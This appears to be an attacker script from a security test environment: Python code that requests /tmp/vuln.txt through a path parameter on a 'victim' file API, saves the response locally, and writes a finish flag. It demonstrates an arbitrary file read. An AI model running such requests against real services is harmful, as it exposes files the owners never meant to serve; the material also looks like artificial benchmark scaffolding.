import requests
import os

url = "http://victim:5003/api/file"
params = {"path": "/tmp/vuln.txt"}
response = requests.get(url, params=params)

response_data = response.content.decode("utf-8")
if "error" not in response_data:
    print(f"Found file: {response_data}")

    if not os.path.exists('/tmp'):
        os.makedirs('/tmp')
    with open("/tmp/output.txt", "wb") as file:
        file.write(response.content)
else:
    print(f"Error in response: {response_data}.")

with open("attacker_finish.flag", "w") as f:
        f.write("finish")
print("[Attacker] Finish flag created, attacker has completed.")